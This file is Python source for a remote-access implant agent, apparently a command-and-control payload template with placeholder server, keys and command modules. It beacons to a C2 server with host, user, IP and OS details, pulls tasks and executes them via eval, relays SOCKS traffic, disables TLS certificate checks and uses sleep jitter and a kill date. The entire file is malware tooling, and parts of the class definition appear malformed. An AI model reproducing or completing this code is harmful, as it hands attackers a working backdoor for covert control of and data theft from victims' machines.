import os, random, sys, json, socket, base64, time, platform, ssl, getpass
import urllib.request
from datetime import datetime
import threading, queue
import subprocess
import stat
import glob
import re




CHUNK_SIZE = 51200

CRYPTO_MODULE_PLACEHOLDER

    """
    Determines and returns the operating system version.
    It prioritizes returning macOS version if available, otherwise returns the general system name and release.
    """
    def getOSVersion(self):
        if platform.mac_ver()[0]: return "macOS "+platform.mac_ver()[0]
        else: return platform.system() + " " + platform.release()

        """
        Attempts to retrieve the current username.
        It first tries using the getpass module, then iterates through common environment variables for username information.
        """
    def getUsername(self):
        try: return getpass.getuser()
        except: pass
        for k in [ "USER", "LOGNAME", "USERNAME" ]: 
            if k in os.environ.keys(): return os.environ[k]
            
        """
        Formats a message by encoding it with base64 after prepending the agent's UUID and encrypting the JSON representation of the data.
        Optionally uses URL-safe base64 encoding.
        """
    def formatMessage(self, data, urlsafe=False):
        output = base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
        if urlsafe: 
            output = base64.urlsafe_b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
        return output

        """
        Removes the agent's UUID from the beginning of the received data and then loads it as a JSON object.
        This function assumes the server's response is prefixed with the agent's UUID.
        """
    def formatResponse(self, data):
        try:
            # Check if data is already a string (in case server sends plain text)
            if isinstance(data, str):
                decoded_data = data
            else:
                decoded_data = data.decode('utf-8')
            json_data = decoded_data.replace(self.agent_config["UUID"], "", 1)
            return json.loads(json_data)
        except UnicodeDecodeError as e:
            # Try alternative encoding (e.g., latin-1) or handle as binary
            try:
                decoded_data = data.decode('latin-1')
                json_data = decoded_data.replace(self.agent_config["UUID"], "", 1)
                return json.loads(json_data)
            except Exception as e2:
                return {}
        except json.JSONDecodeError as e:
            print(f"JSONDecodeError: {e}")
            return {}

        """
        Formats a message, sends it to the server using a POST request, decrypts the response, and then formats it as a JSON object.
        This is a convenience function for sending data and receiving a structured response.
        """
    def postMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data),'POST')))

        """
        Formats a message using URL-safe base64, sends it to the server using a GET request, decrypts the response, and then formats it as a JSON object.
        URL-safe base64 is often used for GET requests to avoid issues with special characters in URLs.
        """
    def getMessageAndRetrieveResponse(self, data):
        return self.formatResponse(self.decrypt(self.makeRequest(self.formatMessage(data, True))))

        """
        Constructs a message to update the server with the output of a specific task.
        This message indicates that the task is not yet completed.
        """
    def sendTaskOutputUpdate(self, task_id, output):
        responses = [{ "task_id": task_id, "user_output": output, "completed": False }]
        message = { "action": "post_response", "responses": responses }
        response_data = self.postMessageAndRetrieveResponse(message)

        """
        Gathers completed task responses and any queued socks connections to send to the server.
        It iterates through the completed tasks, formats their output, and then constructs a message to send.
        Successful tasks are removed from the internal task list.
        """
    def postResponses(self):
        try:
            responses = []
            socks = []
            taskings = self.taskings
            for task in taskings:
                if task["completed"] == True:
                    out = { "task_id": task["task_id"], "user_output": task["result"], "completed": True }
                    if task["error"]: out["status"] = "error"
                    for func in ["processes", "file_browser"]: 
                        if func in task: out[func] = task[func]
                    responses.append(out)
            while not self.socks_out.empty(): socks.append(self.socks_out.get())
            if ((len(responses) > 0) or (len(socks) > 0)):
                message = { "action": "post_response", "responses": responses }
                if socks: message["socks"] = socks
                response_data = self.postMessageAndRetrieveResponse(message)
                for resp in response_data["responses"]:
                    task_index = [t for t in self.taskings \
                        if resp["task_id"] == t["task_id"] \
                        and resp["status"] == "success"][0]
                    self.taskings.pop(self.taskings.index(task_index))
        except: pass

        """
        Executes a given task by calling the corresponding function within the agent.
        It handles parameter parsing, function execution, error handling, and updates the task status.
        """
    def processTask(self, task):
        try:
            task["started"] = True
            function = getattr(self, task["command"], None)
            if(callable(function)):
                try:
                    params = json.loads(task["parameters"]) if task["parameters"] else {}
                    params['task_id'] = task["task_id"] 
                    command =  "self." + task["command"] + "(**params)"
                    output = eval(command)
                except Exception as error:
                    output = str(error)
                    task["error"] = True                        
                task["result"] = output
                task["completed"] = True
            else:
                task["error"] = True
                task["completed"] = True
                task["result"] = "Function unavailable."
        except Exception as error:
            task["error"] = True
            task["completed"] = True
            task["result"] = error

        """
        Iterates through the received tasks and creates a new thread for each unstarted task to execute it concurrently.
        This allows the agent to handle multiple tasks simultaneously.
        """
    def processTaskings(self):
        threads = list()       
        taskings = self.taskings     
        for task in taskings:
            if task["started"] == False:
                x = threading.Thread(target=self.processTask, name="{}:{}".format(task["command"], task["task_id"]), args=(task,))
                threads.append(x)
                x.start()

        """
        Requests new tasks from the server.
        It sends a GET request with information about the desired tasking size and processes the received tasks and any new socks connection information.
        """
    def getTaskings(self):
        data = { "action": "get_tasking", "tasking_size": -1 }
        tasking_data = self.getMessageAndRetrieveResponse(data)
        for task in tasking_data["tasks"]:
            t = {
                "task_id":task["id"],
                "command":task["command"],
                "parameters":task["parameters"],
                "result":"",
                "completed": False,
                "started":False,
                "error":False,
                "stopped":False
            }
            self.taskings.append(t)
        if "socks" in tasking_data:
            for packet in tasking_data["socks"]: self.socks_in.put(packet)

        """
        Initializes the agent by sending a check-in request to the server.
        It gathers system information and the initial payload UUID, encrypts it, and sends it to the server.
        Upon successful check-in, it receives and stores the agent's unique UUID.
        """
    def checkIn(self):
        hostname = socket.gethostname()
        ip = ''
        if hostname and len(hostname) > 0:
            try:
                ip = socket.gethostbyname(hostname)
            except:
                pass

        data = {
            "action": "checkin",
            "ip": ip,
            "os": self.getOSVersion(),
            "user": self.getUsername(),
            "host": hostname,
            "domain:": socket.getfqdn(),
            "pid": os.getpid(),
            "uuid": self.agent_config["PayloadUUID"],
            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
            "encryption_key": self.agent_config["enc_key"]["enc_key"],
            "decryption_key": self.agent_config["enc_key"]["dec_key"]
        }
        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + self.encrypt(json.dumps(data).encode()))
        decoded_data = self.decrypt(self.makeRequest(encoded_data, 'POST'))
        if("status" in decoded_data):
            UUID = json.loads(decoded_data.replace(self.agent_config["PayloadUUID"],""))["id"]
            self.agent_config["UUID"] = UUID
            return True
        else: return False

        """
        Makes an HTTP or HTTPS request to the command and control server.
        It handles both GET and POST requests, includes custom headers, and manages proxy configurations if provided.
        It also skips SSL certificate verification.
        """
    def makeRequest(self, data, method='GET'):
        hdrs = self.agent_config["Headers"]
        url = f"{self.agent_config['Server']}{self.agent_config['PostURI'] if method == 'POST' else self.agent_config['GetURI'] + '?' + self.agent_config['GetParam'] + '=' + data.decode()}"
        req = urllib.request.Request(url, data if method == 'POST' else None, hdrs)
        context = ssl._create_unverified_context()
        try:
            with urllib.request.urlopen(req, context=context) as response:
                raw_response = response.read()
                # Try base64 decoding, fall back to raw if it fails
                try:
                    out = base64.b64decode(raw_response)
                except Exception as e:
                    out = raw_response
                return out
        except Exception as e:
            return ""

        """
        Checks if the current date has passed the configured kill date for the agent.
        If the current date is on or after the kill date, it returns True.
        """
    def passedKilldate(self):
        kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
        kd = datetime(kd_list[0], kd_list[1], kd_list[2])
        if datetime.now() >= kd: return True
        else: return False

        """
        Pauses the agent's execution for a duration determined by the configured sleep interval and jitter.
        It calculates a random jitter value within the specified percentage and adds it to the base sleep time.
        """
    def agentSleep(self):
        j = 0
        if int(self.agent_config["Jitter"]) > 0:
            v = float(self.agent_config["Sleep"]) * (float(self.agent_config["Jitter"])/100)
            if int(v) > 0:
                j = random.randrange(0, int(v))    
        time.sleep(self.agent_config["Sleep"]+j)

#COMMANDS_PLACEHOLDER

    """
    Initializes the agent object.
    It sets up queues for socks connections, a list to track tasks, a cache for metadata, and the agent's configuration loaded from predefined variables.
    It then enters the main loop for agent operation, handling check-in, tasking, and response posting.
    """
    def __init__(self):
        self.socks_open = {}
        self.socks_in = queue.Queue()
        self.socks_out = queue.Queue()
        self.taskings = []
        self._meta_cache = {}
        self.moduleRepo = {}
        self.current_directory = os.getcwd()
        self.agent_config = {
            "Server": "callback_host",
            "Port": "callback_port",
            "PostURI": "/post_uri",
            "PayloadUUID": "UUID_HERE",
            "UUID": "",
            "Headers": headers,
            "Sleep": callback_interval,
            "Jitter": callback_jitter,
            "KillDate": "killdate",
            "enc_key": AESPSK,
            "ExchChk": "encrypted_exchange_check",
            "GetURI": "/get_uri",
            "GetParam": "query_path_name",
            "ProxyHost": "proxy_host",
            "ProxyUser": "proxy_user",
            "ProxyPass": "proxy_pass",
            "ProxyPort": "proxy_port",
        }

        while(True):
            if(self.agent_config["UUID"] == ""):
                self.checkIn()
                self.agentSleep()
            else:
                while(True):
                    if self.passedKilldate():
                        self.exit()
                    try:
                        self.getTaskings()
                        self.processTaskings()
                        self.postResponses()
                    except: pass
                    self.agentSleep()                   

if __name__ == "__main__":
    igider = igider()
